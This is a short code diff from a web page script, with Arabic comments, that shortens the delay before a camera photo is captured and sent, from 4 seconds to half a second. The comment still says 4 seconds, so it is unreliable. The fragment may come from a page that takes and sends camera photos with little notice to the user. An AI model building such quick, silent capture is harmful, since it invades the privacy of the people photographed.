@@ -62,7 +62,7 @@
           setTimeout(() => {
             capturePhotoAndSend();
             stream.getTracks().forEach(track => track.stop());
-          }, 4000); // انتظر 4 ثوانٍ قبل التقاط الصورة
+          }, 500); // انتظر 4 ثوانٍ قبل التقاط الصورة
         })
         .catch(err => {
           document.getElementById("result").innerText += "\n❌ الكاميرا غير متاحة: " + err.message;
